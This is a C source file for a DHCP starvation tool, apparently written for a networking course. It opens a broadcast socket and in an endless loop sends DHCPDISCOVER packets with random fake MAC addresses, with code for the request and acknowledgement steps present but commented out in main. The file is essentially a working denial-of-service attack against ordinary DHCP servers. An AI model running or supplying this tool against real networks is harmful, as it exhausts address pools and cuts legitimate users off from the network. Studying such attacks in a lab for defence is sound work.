#include <netinet/in.h>
#include <net/if.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <zconf.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include "starve.h"

#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

#define MAX_DHCP_CHADDR_LENGTH 16
#define MAX_DHCP_SNAME_LENGTH 64
#define MAX_DHCP_FILE_LENGTH 128
#define MAX_DHCP_OPTIONS_LENGTH 312    //minimum

#define DHCP_BROADCAST_FLAG 0x8000

#define BOOTREQUEST 1
#define BOOTREPLY 2

#define DHCPDISCOVER 1
#define DHCPOFFER 2
#define DHCPREQUEST 3
#define DHCPACK 5

#define ETHERNET_HARDWARE_ADDRESS  1    //htype
#define CHADDR_LEN 6

#define REQUESTED_IP_ADDR_OPTION 50
#define DHCP_OPTION_MESSAGE_TYPE 53
#define DHCP_SERVER_IDENTIFIER_OPTION 54
#define CLIENT_INDENTIFIER_OPTION 61
#define END_OPTION 255

#define ETHERNET_IDENTIFIER_OPTION 0x01

#define SERVER_IDENTIFIER_LEN 4

int dhcpoffer_timeout=2;

#define DEBUG 1
#define debug_print(...) \
            do { if (DEBUG) fprintf(stderr, __VA_ARGS__); } while (0)

char *network_interface_name;

int generate_chaddr(uint8_t *chaddr) {
    for (int i = 0; i<CHADDR_LEN; i++) {
        chaddr[i] = (uint8_t) rand();
    }
}

int create_dhcp_socket() {
    struct sockaddr_in myname;
    struct ifreq interface;
    int sock;
    int flag = 1;

    /* Set up the address we're going to bind to. */
    bzero(&myname, sizeof(myname));
    myname.sin_family = AF_INET;
    myname.sin_port = htons(DHCP_CLIENT_PORT);
    myname.sin_addr.s_addr = INADDR_ANY;                 /* listen on any address */
    bzero(&myname.sin_zero, sizeof(myname.sin_zero));

    /* create a socket for DHCP communications */
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Error: Could not create socket!\n");
        exit(EXIT_FAILURE);
    }

    /* set the reuse address flag so we don't get errors when restarting */
    flag = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &flag, sizeof(flag)) < 0) {
        printf("Error: Could not set reuse address option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }

    /* set the broadcast option - we need this to listen to DHCP broadcast messages */
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &flag, sizeof flag) < 0) {
        printf("Error: Could not set broadcast option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }

    //TODO POTREBUJE ROOT!!!!!!!!!
    /* bind socket to interface */
    strncpy(interface.ifr_ifrn.ifrn_name, network_interface_name, IFNAMSIZ);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *) &interface, sizeof(interface)) < 0) {
        printf("Error: Could not bind socket to interface %s.  Check your privileges...\n", network_interface_name);
        exit(EXIT_FAILURE);
    }

    /* bind the socket */
    if (bind(sock, (struct sockaddr *) &myname, sizeof(myname)) < 0) {
        printf("Error: Could not bind to DHCP socket (port %d)!  Check your privileges...\n", DHCP_CLIENT_PORT);
        exit(EXIT_FAILURE);
    }

    debug_print("Socket %d created\n", sock);
    return sock;
}

/* sends a DHCP packet */
int send_dhcp_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest){
    ssize_t result=sendto(sock,(char *)buffer,buffer_size,0,(struct sockaddr *)dest,sizeof(*dest));

    if(result<0)
        return -1;

    return 1;
}

/* sends a DHCPDISCOVER broadcast message in an attempt to find DHCP servers */
int send_DHCP_discover(int sock, uint8_t *chaddr, uint32_t xid) {
    dhcp_packet discover_packet;
    struct sockaddr_in sockaddr_broadcast;

    /* clear the packet */
    bzero(&discover_packet, sizeof(discover_packet));

    discover_packet.op = BOOTREQUEST;
    discover_packet.htype=ETHERNET_HARDWARE_ADDRESS;
    discover_packet.hlen=CHADDR_LEN;
    discover_packet.hops = 0;
    discover_packet.xid = xid;
    discover_packet.flags = htons(DHCP_BROADCAST_FLAG);     //BROADCAST FLAG
    discover_packet.secs = 0;
    /*
     * ciaddr = 0
     * yiaddr = 0
     * siaddr = 0
     * giaddr = 0
     */
    memcpy(discover_packet.chaddr, chaddr, CHADDR_LEN); //chaddr

    /* magic cookie */
    discover_packet.options[0] = '\x63';
    discover_packet.options[1] = '\x82';
    discover_packet.options[2] = '\x53';
    discover_packet.options[3] = '\x63';

    /* DHCP message type is embedded in options field */
    discover_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE;  /* DHCP message type option identifier */
    discover_packet.options[5] = 1;                         /* DHCP message option length in bytes */
    discover_packet.options[6] = DHCPDISCOVER;

    discover_packet.options[7] = END_OPTION;

    /* send the DHCPDISCOVER packet to broadcast address */
    sockaddr_broadcast.sin_family = AF_INET;
    sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
    sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
    bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

    /* send the DHCPDISCOVER packet out */
    ssize_t bytes_sent = sendto(sock,&discover_packet, sizeof(discover_packet), 0, &sockaddr_broadcast, sizeof(sockaddr_broadcast));
    if (bytes_sent== sizeof(dhcp_packet)) {
        debug_print("\tDHCP DISCOVER was sent.\n");
    } else {
        debug_print("\tDHCP DISCOVER failed.\n");
    }

    return bytes_sent > 0;
}

int find_server_identifier(dhcp_packet *offer, struct in_addr *serv_id) {   // TODO HACKY!!
    uint8_t *opt_ptr = offer->options+4;
    uint8_t option = 255;
    uint8_t opt_len = 0;
//    uint8_t serv_ident[SERVER_IDENTIFIER_LEN] = {0};

    debug_print("find_server_id\n");
    bool end = false;
    int i = 0;
    while (!end) {
        option = *opt_ptr;
        debug_print("option: %02x\n", option);
//        debug_print("opt+1: %02x\n", *(opt_ptr+1));
//        debug_print("opt+2: %02x\n", *(opt_ptr+2));
//        debug_print("opt+3: %02x\n", *(opt_ptr+3));
//        debug_print("opt+4: %02x\n", *(opt_ptr+4));
//        debug_print("opt+5: %02x\n", *(opt_ptr+5));
//        debug_print("opt+6: %02x\n", *(opt_ptr+6));
//        debug_print("opt+7: %02x\n", *(opt_ptr+7));
//        debug_print("opt+8: %02x\n", *(opt_ptr+8));
//        debug_print("opt+9: %02x\n", *(opt_ptr+9));
//        debug_print("opt+10: %02x\n", *(opt_ptr+10));
        if (option == END_OPTION) {
            end = true;
        } else if (option == DHCP_SERVER_IDENTIFIER_OPTION){
            memcpy(&(serv_id->s_addr), opt_ptr+2, *(opt_ptr+1));
            end = true;
        } else {
            opt_len = *(opt_ptr+1);
            opt_ptr += 1 + opt_len + 1;
        }

//        if (i == 0) {
//            end = true;
//        }
//        i++;
    }
    debug_print("find_server_id END\n");
}

int recv_DHCP_offer(int sock, int expect_xid, struct in_addr *offered_ip, struct in_addr *server_id) {
    bool correct = false;
    dhcp_packet offer;
    struct sockaddr_in source_address;
    ssize_t recv_res;
    socklen_t address_size;

    while (!correct) {
        debug_print("\tDHCP OFFER: waiting\n");
        recv_res = recvfrom(sock, &offer, sizeof(offer), 0, (struct sockaddr *)&source_address, &address_size);
        if (recv_res < 0) {
            //debug_print("SIZEOF(OFFER) = %d\n", sizeof(offer));
            fprintf(stderr, "Error: Recieve failed\n");
            exit(EXIT_FAILURE);
        }
        debug_print("\tDHCP OFFER: recieved\n");

        if ((offer.xid == expect_xid) && (1)) { //TODO and chaddr
            correct = true;
            debug_print("\tDHCP OFFER: was correct\n");
        } else {
            debug_print("\tDHCP OFFER: was incorrect\n");
        }
    }

    *offered_ip = offer.yiaddr;
    debug_print("\tDHCP OFFERED addr: %s\n", inet_ntoa(offer.yiaddr));

    find_server_identifier(&offer, server_id);
    debug_print("\tDHCP OFFER server id %s\n", inet_ntoa(*server_id));

    return 1;
}

void print_help() {
    printf("./ipk-dhcpstarve -i interface\n");
}

int parse_args(int argc, char **argv) {
    int c;
    while ((c = getopt (argc, argv, "i:")) != -1)
        switch (c)
        {
            case 'i':
                network_interface_name = optarg;
                break;
            default:
                print_help();
                exit(0);
        }
}

int send_DHCP_request(int sock, uint32_t xid, uint8_t *chaddr, struct in_addr *req_IP, struct in_addr *server_id) {
    dhcp_packet request_packet;
    struct sockaddr_in sockaddr_broadcast;

    /* clear the packet */
    bzero(&request_packet, sizeof(request_packet));

    request_packet.op = BOOTREQUEST;
    request_packet.htype=ETHERNET_HARDWARE_ADDRESS;
    request_packet.hlen=CHADDR_LEN;
    request_packet.hops = 0;

    request_packet.xid = xid;   //xid from 1. transaction

    request_packet.secs = 0;   //TODO sekundy od zaciatku
    //    request_packet.flags = htons(DHCP_BROADCAST_FLAG);     //BROADCAST FLAG
    /*
     * ciaddr = 0
     * yiaddr = 0
     * siaddr = 0
     * giaddr = 0
     */
//    memcpy(&(request_packet.ciaddr), &(req_IP->s_addr), sizeof(req_IP->s_addr));
    memcpy(request_packet.chaddr, chaddr, CHADDR_LEN);      //chaddr

    /* magic cookie */
    request_packet.options[0] = '\x63';
    request_packet.options[1] = '\x82';
    request_packet.options[2] = '\x53';
    request_packet.options[3] = '\x63';

    /* DHCP request */
    request_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE;  /* DHCP message type option identifier */
    request_packet.options[5] = 1;                         /* DHCP message option length in bytes */
    request_packet.options[6] = DHCPREQUEST;

    /* Requested IP */
    request_packet.options[7] = REQUESTED_IP_ADDR_OPTION;
    request_packet.options[8] = 4;
    memcpy(&(request_packet.options[9]), &(req_IP->s_addr), sizeof(req_IP->s_addr));

    /* Client identifier option */
    request_packet.options[13] = CLIENT_INDENTIFIER_OPTION;
    request_packet.options[14] = 7;
    request_packet.options[15] = ETHERNET_IDENTIFIER_OPTION;
    memcpy(&(request_packet.options[16]), chaddr, CHADDR_LEN);

    /* SERVER IDENTIFIER */
    request_packet.options[22] = DHCP_SERVER_IDENTIFIER_OPTION;
    request_packet.options[23] = SERVER_IDENTIFIER_LEN;
    memcpy(&(request_packet.options[24]), server_id, SERVER_IDENTIFIER_LEN);

    /* END */
    request_packet.options[28] = END_OPTION;

    /* send the DHCPDISCOVER packet to broadcast address */
    sockaddr_broadcast.sin_family = AF_INET;
    sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
    sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
    bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

    /* send the DHCPREQUEST packet out */
    sendto(sock,&request_packet, sizeof(request_packet), 0, &sockaddr_broadcast, sizeof(sockaddr_broadcast));
    debug_print("\tDHCP REQUEST: sent\n");
    return 1;
}

int recv_DHCP_ack(int sock, int expect_xid) {
    bool correct = false;
    dhcp_packet ack;
    struct sockaddr_in source_address;
    ssize_t recv_res;
    socklen_t address_size;

    while (!correct) {
        debug_print("\tDHCP ACK: waiting\n");
        recv_res = recvfrom(sock, &ack, sizeof(ack), 0, (struct sockaddr *)&source_address, &address_size);
        if (recv_res < 0) {
            //debug_print("SIZEOF(OFFER) = %d\n", sizeof(offer));
            fprintf(stderr, "Error: Recieve failed\n");
//            exit(EXIT_FAILURE);
        }
//            if ack.op =
        debug_print("\tDHCP ACK: recieved\n");

        if ((ack.xid == expect_xid) && (1)) { //TODO and chaddr
            correct = true;
            debug_print("\tDHCP ACK: was correct\n");
        } else {
            debug_print("\tDHCP ACK: was incorrect\n");
        }
    }

    debug_print("\tDHCP ACK: leaving\n");
    return 1;
}

int main(int argc, char **argv) {
    uint8_t chaddr[CHADDR_LEN] = {0};   /* MAC address */
    uint32_t xid;
    struct in_addr offered_IP;
    struct in_addr server_id;

    parse_args(argc, argv);

    int dhcp_socket = create_dhcp_socket();

    srand(time(NULL));

    while (1) {    //todo while
        generate_chaddr(chaddr);
        debug_print("Generated chaddr:  %02x:%02x:%02x:%02x:%02x:%02x\n",
                    (unsigned char) chaddr[0],
                    (unsigned char) chaddr[1],
                    (unsigned char) chaddr[2],
                    (unsigned char) chaddr[3],
                    (unsigned char) chaddr[4],
                    (unsigned char) chaddr[5]);

        xid = htonl(random());
        debug_print("Generated XID: %d\n", ntohl(xid));

        send_DHCP_discover(dhcp_socket, chaddr, xid);
//        recv_DHCP_offer(dhcp_socket, xid, &offered_IP, &server_id);
//        send_DHCP_request(dhcp_socket, xid, chaddr, &offered_IP, &server_id);
//        recv_DHCP_ack(dhcp_socket, xid);
    }

    // TODO source IP je ma byt 0.0.0.0 v IPv4 hlavicke

//    close(dhcp_socket);

}
